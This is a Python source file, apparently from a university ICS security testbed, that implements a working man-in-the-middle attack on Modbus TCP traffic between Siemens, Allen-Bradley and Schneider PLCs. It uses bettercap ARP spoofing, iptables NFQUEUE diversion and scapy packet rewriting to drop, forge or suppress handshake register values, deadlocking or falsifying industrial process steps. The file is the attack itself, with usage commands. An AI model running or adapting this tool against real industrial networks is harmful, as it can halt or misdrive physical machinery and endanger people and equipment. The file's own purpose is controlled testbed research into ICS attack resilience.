#!/usr/bin/env python3
"""
attack_injector.py

MATRIX Testbed — inter-PLC Modbus handshake attack injector (runs on Kali).

OVERVIEW:
This is MATRIX inter-PLC Modbus attack injector. It is designed to sit in between the PLC-to-PLC communication links
and supress, forge or replay specific Modbus Handoff signals between the PLCs.

The thread model is an attack only in the network layer (doesn't have access to Physcal Plant), and operates in Controller-LAN
segment o the testbed. (192.168.50.x/24).

INTER-PLC COMMUNICATION:

Micro820 (Allen-Bradley) acts as the Modbus Server, and S7-1200 and TM221 act as Modbus Clients. 
The communication is over Modbus TCP (port 502). AB exposes two holding registers (400001 and 400002) referred to as 
SiemensHandoffCode and SchnienerHandshakeCode respectively. 
When S7-1200 has a workpiece ready for pick up, is writes SiemensHandoffCode = 1, AB picks the workpiece and 
writes write SiemensHandoffCode = 2 to acknowledge. Similarly, when AB has a workpiece ready for trasnport, 
it writes  SchnienerHandshakeCode = 1, TM221 picks the workpiece and writes SchnienerHandshakeCode = 2 to acknowledge.

The stages a re tightly interlocked: S7-1200 will not proceed to the next step if it hasn't recieved acknoledgement from AB,
and AB will not pick a work piece if it hasn't recieved an acknowledgement from TM221 
(Even if S7-1200 has written SiemensHandoffCode = 1). 

The S7-1200 and AB are blind-trust channels (no sensor cross-check), but 
TM221 has a light barrier cross-check before acting on the "ready" signal from AB.



 In summary, here ar the four signal transitions and how each travels on the wire:
    T1  S7 "ready"  reg0=1 : S7  -> AB  WRITE  (single packet)   [blind]
    T2  AB "ack"    reg0=2 : S7 polls AB, reads 2 in FC03 REPLY  [blind]
    T3  AB "ready"  reg1=1 : TM221 polls AB, reads 1 in FC03 REPLY [DEFENDED]
    T4  TM221 "ack" reg1=2 : TM221 -> AB WRITE (single packet)    [blind]

        
MECHANISM (how the attack injector works):
    * write transitions (T1, T4): suppress = DROP the write packet. One dropped
      packet permanently deadlocks that cycle (clients write the signal once,
      then only poll; no retry). 
      
      forge/replay (inject a write into the live TCP session) is STRETCH/experimental — see --action.
    
    * read-reply transitions (T2, T3): suppress/forge = REWRITE the target
      register's 2 bytes inside AB's FC03 reply, sustained for the window
      (clients poll continuously). Register values are fixed 2-byte fields, so
      rewrites are ALWAYS same-length -> TCP never desyncs (safe).

PIPELINE
    bettercap arp.spoof (get on-path between the chosen client and AB)
      -> kernel ip_forward=1 (so non-target traffic still flows)
      -> iptables FORWARD ... -j NFQUEUE (divert ONLY this pair's tcp/502)
      -> this script (netfilterqueue + scapy): per-packet verdict
             accept (forward verbatim)  — the default for everything
             drop                        — suppression of a write
             modify+accept               — reply rewrite (suppress/forge)
    
    Everything is restored on exit (iptables flushed, bettercap stopped so ARP
    is repaired, ip_forward restored) — including on Ctrl-C / crash.

DATA COLLECTION
    results/<run_id>/attack_log.json  — armed/onset/close timestamps + every
    manipulated packet. Shares --run-id with the experiment logger so the pcap
    (SPAN), the state log (SQLite) and this attack-log align by run_id + time.
    (Kali and the SCADA PC must be NTP-synced for cross-host timestamp
    alignment.)


USAGE (run as root on Kali)
    # suppress S7's "ready" (T1) — single-packet deadlock, event-triggered:
    sudo python3 attack_injector.py --pair s7-ab --transition ready \
         --action suppress --iface eth1 --run-id s1_suppress_ready_0001

    # deny AB's "ack" to S7 (T2) — sustained reply-rewrite, 30 s window:
    sudo python3 attack_injector.py --pair s7-ab --transition ack \
         --action suppress --iface eth1 --hold 30 --run-id s1_suppress_ack_0001

    # forge AB's "ready" to TM221 (T3) — should be DEFEATED by the light barrier:
    sudo python3 attack_injector.py --pair tm221-ab --transition ready \
         --action forge --iface eth1 --hold 30 --run-id s2_forge_ready_defended_0001

    # For time-based instead of event-triggered: add --window-trigger <seconds>

SAFETY
    ARP-spoofing live PLC coordination is disruptive by nature. Use bounded
    windows, keep the physical e-stop in reach, and verify on a quiet cycle
    first. --dry-run prints the plan and changes nothing.

Author : MATRIX / Intelligent Connectivity Group — UCT
"""

import argparse
import json
import os
import signal
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone

# Third-party (install on Kali):
#   sudo apt install bettercap libnetfilter-queue-dev
#   pip install netfilterqueue scapy
from netfilterqueue import NetfilterQueue           # type: ignore
from scapy.all import IP, TCP, Raw                   # type: ignore

# -------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------- 

AB_IP        = "192.168.50.20"          # Micro820 — the Modbus SERVER
CLIENT_IP    = {"s7-ab": "192.168.50.10", "tm221-ab": "192.168.50.50"}
MODBUS_PORT  = 502
QUEUE_NUM    = 1                         # NFQUEUE number (override with --queue-num)
RESULTS_DEFAULT = "results" # This the folder where results are kept.

# Per (pair, transition): which register, how the signal travels, its value, and
# whether the receiver sensor-cross-checks it. Derived — not CLI args.
#   carrier "write"      : client -> AB write of the signal (suppress = drop)
#   carrier "read_reply" : client polls AB; signal rides AB's FC03 reply
#                          (suppress/forge = rewrite that register in the reply)
TRANSITIONS = {
    ("s7-ab",    "ready"): dict(reg=0, carrier="write",      signal=1, defended=False, tag="T1"),
    ("s7-ab",    "ack"):   dict(reg=0, carrier="read_reply", signal=2, defended=False, tag="T2"),
    ("tm221-ab", "ready"): dict(reg=1, carrier="read_reply", signal=1, defended=True,  tag="T3"),
    ("tm221-ab", "ack"):   dict(reg=1, carrier="write",      signal=2, defended=False, tag="T4"),
}

# Modbus function codes we care about.
FC_READ_HOLDING   = 0x03
FC_WRITE_SINGLE   = 0x06
FC_WRITE_MULTIPLE = 0x10

MAX_LOG_EVENTS = 20000          # cap the attack-log event list (counters still exact)


# --------------------------------------------------------------------------
# RUNTIME STATE (mutated by the packet handler and the main loop)
# --------------------------------------------------------------------------

STATE = {
    "window_open": False,
    "finished": False,
    "armed_ts": None,          # perf/time when we started listening
    "armed_wall": None,        # wall clock (ISO) when armed
    "open_ts": None,           # monotonic time the window opened (onset)
    "open_wall": None,
    "close_wall": None,
}
COUNTERS = {"matched": 0, "dropped": 0, "rewritten": 0, "passed": 0, "injected": 0}
EVENTS = []                    # list of per-manipulation records (capped)

# Outstanding FC03 reads, so we can locate a register inside a response that
# carries only a byte-count + values (no address). Keyed by (client_port, txid).
PENDING_READS = {}            # (sport, txid) -> (start_addr, qty, seen_monotonic)

# Filled in from args at startup (so the handler can read them without globals-soup).
CFG = {}


# ==========================================================================
# SMALL HELPERS
# ==========================================================================
def now_iso():
    """
    Return the current UTC time as an ISO 8601 string, for logging."""
    
    return datetime.now(timezone.utc).isoformat()

def log_event(rec):
    
    """"""
    # Record a manipulation (dropped/rewritten/injected). Bounded in size.
    if len(EVENTS) < MAX_LOG_EVENTS:
        EVENTS.append(rec)

def u16(b, i):
    # Read a big-endian uint16 from bytes b at offset i (Modbus is big-endian).
    return (b[i] << 8) | b[i + 1]

def prune_pending(older_than=5.0):
    # Drop stale outstanding-read entries so the dict can't grow unbounded.
    cutoff = time.monotonic() - older_than
    for k in [k for k, v in PENDING_READS.items() if v[2] < cutoff]:
        PENDING_READS.pop(k, None)



# PACKET HANDLER — the core verdict logic. Called by NFQUEUE for every diverted
# packet. Default action is ALWAYS accept (forward verbatim); we only drop or
# rewrite the exact target transition while the window is open.

def handle(packet):
    """
    NFQUEUE callback for each diverted packet. Accept, drop, or modify+accept.
    
    Args:
        packet: netfilterqueue.Packet object representing the diverted packet.
    """
    
    try:
        _handle(packet)
    except Exception as exc:
        # Never let a handler bug wedge the process holding the whole pair's
        # traffic: on any error, pass the packet through untouched.
        try:
            packet.accept()
        except Exception:
            pass
        log_event({"ts": now_iso(), "action": "handler_error", "detail": repr(exc)})


def _handle(packet):
    """
    Internal handler logic. Separated for exception isolation.  
    """
    print(f"[{now_iso()}] packet: {len(packet.get_payload())} bytes") #debug print
    
    raw = packet.get_payload()          # IP-layer bytes of the forwarded packet
    pkt = IP(raw)

    # Only Modbus/TCP between our pair is interesting; everything else forwards.
    if TCP not in pkt or Raw not in pkt:
        COUNTERS["passed"] += 1
        packet.accept(); return

    tcp = pkt[TCP] #TCP layer(transport) datagram
    load = bytes(pkt[Raw].load)
    if len(load) < 8:                   # too short to contain a full MBAP header
        COUNTERS["passed"] += 1
        packet.accept(); return

    # MBAP header: [txid(2)][proto(2)][len(2)][unit(1)] then PDU [fc(1)][data...]
    txid = u16(load, 0)
    fc   = load[7]

    to_ab   = (pkt[IP].dst == AB_IP and tcp.dport == MODBUS_PORT)   # client -> AB (request)
    from_ab = (pkt[IP].src == AB_IP and tcp.sport == MODBUS_PORT)   # AB -> client (reply)

    reg      = CFG["reg"]
    carrier  = CFG["carrier"]
    signal   = CFG["signal"]
    to_value = CFG["to_value"]
    action   = CFG["action"]

    # Track FC03 read requests so we can locate the register in replies 
    if to_ab and fc == FC_READ_HOLDING and len(load) >= 12:
        start = u16(load, 8); qty = u16(load, 10)
        PENDING_READS[(tcp.sport, txid)] = (start, qty, time.monotonic())
        prune_pending()
        COUNTERS["passed"] += 1
        packet.accept(); return

    #
    # WRITE-carrier transitions (T1 ready reg0=1, T4 ack reg1=2)
    # suppress = drop the client's write of the signal value.
    # 
    if carrier == "write" and to_ab and fc in (FC_WRITE_SINGLE, FC_WRITE_MULTIPLE):
        wrote_signal, where = _write_sets_reg_to(load, fc, reg, signal)
        if wrote_signal:
            if action == "suppress":
                _maybe_open_window()
                if STATE["window_open"]:
                    COUNTERS["matched"] += 1
                    COUNTERS["dropped"] += 1
                    log_event({"ts": now_iso(), "action": "drop_write",
                               "fc": fc, "reg": reg, "value": signal, "txid": txid})
                    packet.drop()               # <-- suppression: the write never reaches AB
                    return
            # forge/replay for write transitions are injection (stretch) — see note.
        COUNTERS["passed"] += 1
        packet.accept(); return

    # 
    # READ-REPLY-carrier transitions (T2 ack reg0=2, T3 ready reg1=1)
    # suppress = rewrite the register to a neutral value (default 0) so the
    #            client never sees the signal.
    # forge    = rewrite the register TO the signal value so the client sees a
    #            signal that was never set (T3 forge should be DEFEATED by the
    #            light barrier — we still perform it; TM221's logic refuses it).
    # 
   
    if carrier == "read_reply" and from_ab and fc == FC_READ_HOLDING and len(load) >= 9:
        byte_count = load[8]
        key = (tcp.dport, txid)         # reply's dest port == client's source port
        pend = PENDING_READS.pop(key, None)
        if pend is None:
            # We didn't see the matching request (started mid-stream) — forward.
            COUNTERS["passed"] += 1
            packet.accept(); return
        start, qty, _ = pend
        if not (start <= reg < start + qty):
            COUNTERS["passed"] += 1
            packet.accept(); return      # this poll doesn't include our register

        val_off = 9 + (reg - start) * 2  # byte offset of our register's value
        if val_off + 2 > 8 + 1 + byte_count or val_off + 2 > len(load):
            COUNTERS["passed"] += 1
            packet.accept(); return      # malformed/short — don't touch

        current = u16(load, val_off)

        # Decide the desired value for this action.
        if action == "suppress":
            desired = to_value           # default 0 — deny the signal
            # Only act (and open the window) once the signal actually appears,
            # in event mode; in time mode the window is already open.
            trigger_here = (current == signal)
        else:  # forge / replay (read_reply) — fabricate the signal
            desired = signal if to_value is None else to_value
            trigger_here = True          # nothing to wait for; fabricate on sight

        if not STATE["window_open"]:
            if CFG["time_mode"]:
                pass                      # time mode opens in the main loop
            elif trigger_here:
                _open_window()            # event mode: open on first actionable reply

        if STATE["window_open"] and current != desired:
            # Same-length 2-byte rewrite — safe, no TCP desync.
            new = bytearray(load)
            new[val_off]     = (desired >> 8) & 0xFF
            new[val_off + 1] = desired & 0xFF
            pkt[Raw].load = bytes(new)
            del pkt[IP].chksum            # force scapy to recompute checksums
            del pkt[TCP].chksum
            packet.set_payload(bytes(pkt))
            COUNTERS["matched"] += 1
            COUNTERS["rewritten"] += 1
            log_event({"ts": now_iso(), "action": "rewrite_reply", "reg": reg,
                       "from": current, "to": desired, "txid": txid})
            packet.accept(); return

        COUNTERS["passed"] += 1
        packet.accept(); return

    # Anything else: forward untouched.
    COUNTERS["passed"] += 1
    packet.accept()


def _write_sets_reg_to(load, fc, reg, value):
    """Does this FC06/FC16 write set `reg` to `value`? Returns (bool, detail)."""
    if fc == FC_WRITE_SINGLE and len(load) >= 12:
        addr = u16(load, 8); val = u16(load, 10)
        return (addr == reg and val == value), ("single", addr, val)
    if fc == FC_WRITE_MULTIPLE and len(load) >= 13:
        start = u16(load, 8); qty = u16(load, 10)
        if start <= reg < start + qty:
            voff = 13 + (reg - start) * 2
            if voff + 2 <= len(load):
                return (u16(load, voff) == value), ("multiple", start, qty)
    return (False, None)


# ----------------------------------------------------------------------------
# WINDOW CONTROL
# ----------------------------------------------------------------------------

def _open_window():
    STATE["window_open"] = True
    STATE["open_ts"] = time.monotonic()
    STATE["open_wall"] = now_iso()
    print(f"[{STATE['open_wall']}] WINDOW OPEN (onset) — acting for {CFG['hold']} s")

def _maybe_open_window():
    # For write-suppress in event mode: open on the first matching write.
    if not STATE["window_open"] and not CFG["time_mode"]:
        _open_window()

def _close_window():
    if STATE["window_open"]:
        STATE["window_open"] = False
        STATE["close_wall"] = now_iso()
        print(f"[{STATE['close_wall']}] WINDOW CLOSED")

def check_timing(args):
    """Drive the window state machine from the main loop (called ~2x/sec)."""
    nowm = time.monotonic()
    if CFG["time_mode"] and not STATE["window_open"] and not STATE["finished"]:
        _open_window()                                   # time mode: open immediately
    if STATE["window_open"] and (nowm - STATE["open_ts"]) >= CFG["hold"]:
        _close_window(); STATE["finished"] = True        # hold elapsed -> done
    # Event mode: give up if the trigger never appears within --max-wait.
    if (not CFG["time_mode"] and not STATE["window_open"]
            and (nowm - STATE["armed_ts"]) >= args.max_wait):
        print(f"[{now_iso()}] trigger not seen within {args.max_wait}s — giving up")
        STATE["finished"] = True


# ----------------------------------------------------------------------------
# SETUP / TEARDOWN  (iptables, ip_forward, bettercap) — all reversible.
# ----------------------------------------------------------------------------
_IPTABLES_RULES = []            # rules we added, to delete on teardown
_BETTERCAP = None               # bettercap subprocess handle
_ORIG_IP_FORWARD = None         # original /proc value, to restore

def run_cmd(cmd):
    return subprocess.run(cmd, check=True, capture_output=True, text=True)

def setup_network(args, client_ip):
    global _ORIG_IP_FORWARD, _BETTERCAP

    # 1) Enable IP forwarding so NON-target traffic between the hosts still flows
    #    while we're on-path; remember the original value to restore it.
    with open("/proc/sys/net/ipv4/ip_forward") as f:
        _ORIG_IP_FORWARD = f.read().strip()
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    # 2) Divert ONLY this pair's Modbus/502 (both directions) into NFQUEUE.
    #    Everything else the kernel forwards normally.
    rules = [
        ["iptables", "-I", "FORWARD", "-p", "tcp", "-s", client_ip, "-d", AB_IP,
         "--dport", str(MODBUS_PORT), "-j", "NFQUEUE", "--queue-num", str(args.queue_num)],
        ["iptables", "-I", "FORWARD", "-p", "tcp", "-s", AB_IP, "-d", client_ip,
         "--sport", str(MODBUS_PORT), "-j", "NFQUEUE", "--queue-num", str(args.queue_num)],
    ]
    for r in rules:
        run_cmd(r)
        _IPTABLES_RULES.append(r)

    # 3) Get on-path with bettercap ARP-spoof (full-duplex) between client & AB.
    if not args.no_bettercap:
        caplet = (f"set arp.spoof.targets {client_ip},{AB_IP}; "
                  f"set arp.spoof.fullduplex true; arp.spoof on")
        _BETTERCAP = subprocess.Popen(
            ["bettercap", "-iface", args.iface, "-eval", caplet],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)   # let ARP poisoning take effect before we start acting
        if _BETTERCAP.poll() is not None:
            raise RuntimeError("bettercap exited immediately — check --iface / permissions")

def teardown_network():
    # Reverse everything, best-effort, in safe order. Idempotent.
    global _BETTERCAP
    if _BETTERCAP is not None:
        try:
            _BETTERCAP.terminate()          # bettercap repairs ARP on shutdown
            _BETTERCAP.wait(timeout=5)
        except Exception:
            try: _BETTERCAP.kill()
            except Exception: pass
        _BETTERCAP = None
    for r in list(_IPTABLES_RULES):
        # Convert the "-I FORWARD ..." insert into a "-D FORWARD ..." delete.
        delr = ["iptables", "-D"] + r[2:]
        try: run_cmd(delr)
        except Exception: pass
        _IPTABLES_RULES.remove(r)
    if _ORIG_IP_FORWARD is not None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(_ORIG_IP_FORWARD)
        except Exception:
            pass


# --------------------------------------------------------------------------------
# ATTACK LOG
# ==========================================================================
def write_attack_log(args, client_ip, profile):
    out_dir = os.path.join(args.results, args.run_id)
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, "attack_log.json")
    doc = {
        "run_id": args.run_id,
        "config": {
            "pair": args.pair, "transition": args.transition, "action": args.action,
            "register": profile["reg"], "carrier": profile["carrier"],
            "signal_value": profile["signal"], "to_value": CFG["to_value"],
            "sensor_defended": profile["defended"], "transition_tag": profile["tag"],
            "trigger_mode": "time" if CFG["time_mode"] else "event",
            "hold_s": CFG["hold"], "iface": args.iface,
            "client_ip": client_ip, "ab_ip": AB_IP,
        },
        "armed_wall": STATE["armed_wall"],
        "window_open_wall": STATE["open_wall"],     # ONSET — align with pcap/state here
        "window_close_wall": STATE["close_wall"],
        "counters": COUNTERS,
        "events": EVENTS,
        "events_truncated": len(EVENTS) >= MAX_LOG_EVENTS,
    }
    with open(path, "w") as f:
        json.dump(doc, f, indent=2)
    print(f"attack-log written: {path}")
    return path


# ==========================================================================
# MAIN
# ==========================================================================
def build_parser():
    p = argparse.ArgumentParser(description="MATRIX inter-PLC Modbus handshake attack injector.")
    p.add_argument("--pair", required=True, choices=["s7-ab", "tm221-ab"],
                   help="which client<->AB conversation to sit in")
    p.add_argument("--transition", required=True, choices=["ready", "ack"],
                   help="which signal: ready (=1) or ack (=2)")
    p.add_argument("--action", required=True, choices=["suppress", "forge", "replay"],
                   help="suppress (drop/deny) | forge (fabricate) | replay")
    p.add_argument("--iface", required=True, help="Kali control-LAN interface (for bettercap)")
    p.add_argument("--run-id", required=True, help="shared with the experiment logger")
    p.add_argument("--hold", type=float, default=30.0,
                   help="window duration in seconds once open (default 30)")
    p.add_argument("--window-trigger", type=float, default=None, metavar="SEC",
                   help="TIME-BASED mode: open immediately and act for SEC seconds. "
                        "Omit for EVENT-triggered (default): open on the target transition.")
    p.add_argument("--to-value", type=int, default=None,
                   help="override the rewrite value (read-reply transitions). "
                        "Default: suppress->0, forge->signal value.")
    p.add_argument("--max-wait", type=float, default=120.0,
                   help="event mode: give up if the trigger isn't seen in this many s")
    p.add_argument("--queue-num", type=int, default=QUEUE_NUM, help="NFQUEUE number")
    p.add_argument("--results", default=RESULTS_DEFAULT, help="output directory")
    p.add_argument("--no-bettercap", action="store_true",
                   help="skip ARP-spoof (use if already on-path, or for testing)")
    p.add_argument("--dry-run", action="store_true", help="print the plan and exit")
    return p


def main():
    args = build_parser().parse_args()

    profile = TRANSITIONS.get((args.pair, args.transition))
    if profile is None:
        print(f"no transition for pair={args.pair} transition={args.transition}")
        return 2
    client_ip = CLIENT_IP[args.pair]

    # Resolve the rewrite target value for read-reply actions.
    if args.to_value is not None:
        to_value = args.to_value
    elif args.action == "suppress":
        to_value = 0                          # deny the signal
    else:
        to_value = profile["signal"]          # forge/replay -> fabricate the signal

    CFG.update({
        "reg": profile["reg"], "carrier": profile["carrier"], "signal": profile["signal"],
        "action": args.action, "to_value": to_value,
        "time_mode": args.window_trigger is not None,
        "hold": args.window_trigger if args.window_trigger is not None else args.hold,
    })

    # Describe the plan (and the predicted outcome, for the lab notebook).
    predicted = _predict(args, profile)
    print("=" * 72)
    print(f" MATRIX attack injector — {profile['tag']}")
    print(f"   pair/transition : {args.pair} / {args.transition}  (reg {profile['reg']}, "
          f"signal={profile['signal']}, carrier={profile['carrier']})")
    print(f"   action          : {args.action}")
    print(f"   trigger         : {'time-based' if CFG['time_mode'] else 'event-triggered'}"
          f"  hold={CFG['hold']} s")
    print(f"   on-path         : {client_ip} <-> {AB_IP} via {args.iface}"
          f"{' (bettercap SKIPPED)' if args.no_bettercap else ''}")
    print(f"   sensor-defended : {profile['defended']}")
    print(f"   PREDICTED       : {predicted}")
    print(f"   run-id          : {args.run_id}")
    print("=" * 72)

    if args.dry_run:
        print("dry-run — no changes made."); return 0

    if os.geteuid() != 0:
        print("ERROR: must run as root (NFQUEUE/iptables/bettercap)."); return 2

    # --- Arm: set up on-path pipeline, then run the NFQUEUE loop ---
    STATE["armed_ts"] = time.monotonic()
    STATE["armed_wall"] = now_iso()

    nfqueue = NetfilterQueue()
    # Clean restore on SIGINT/SIGTERM as well as normal/exception exit.
    def _sig(_signo, _frame):
        STATE["finished"] = True
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    try:
        setup_network(args, client_ip)
        nfqueue.bind(args.queue_num, handle)
        # Integrate NFQUEUE with a timeout so we can drive the window clock.
        s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(0.5)
        print(f"[{now_iso()}] ARMED — waiting"
              f"{' for trigger' if not CFG['time_mode'] else ''} ...")
        while not STATE["finished"]:
            try:
                nfqueue.run_socket(s)          # process available packets, then
            except socket.timeout:
                pass                           # ... fall through to the clock check
            except Exception as exc:
                print(f"nfqueue error: {exc}")
            check_timing(args)
        s.close()
    finally:
        _close_window()
        try: nfqueue.unbind()
        except Exception: pass
        teardown_network()
        write_attack_log(args, client_ip, profile)
        print(f"counters: {COUNTERS}")

    return 0


def _predict(args, profile):
    """One-line predicted outcome, for the hypothesis-then-result record."""
    tag, a = profile["tag"], args.action
    if a == "suppress" and profile["carrier"] == "write":
        return ("single dropped write -> receiver never sees signal; "
                "deadlock/starvation (blind-trust channel)")
    if a == "suppress" and profile["carrier"] == "read_reply":
        return "sustained reply-rewrite denies the signal -> blocked/frozen process despite correct physical state"
    if a == "forge" and profile["defended"]:
        return "fabricated signal SHOULD BE DEFEATED by the light-barrier cross-check (expected no mis-action)"
    if a == "forge":
        return "fabricated signal accepted (blind trust) -> receiver acts on false state"
    if a == "replay":
        return "replayed signal (blind-trust channel) -> duplicate/false actuation"
    return "see matrix"


if __name__ == "__main__":
    sys.exit(main())